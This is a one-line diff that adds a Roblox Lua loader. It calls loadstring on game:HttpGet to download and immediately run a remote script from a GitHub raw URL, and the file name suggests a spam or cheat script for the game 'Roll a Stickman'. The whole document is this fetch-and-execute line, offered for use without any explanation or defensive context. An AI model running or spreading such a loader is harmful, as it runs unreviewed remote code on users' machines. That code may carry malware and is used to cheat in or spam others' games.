@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandLobsterFill/loaders/main/loaders/update-roll-a-stickman-spam4-11m4kscigxpjc4.lua"))()
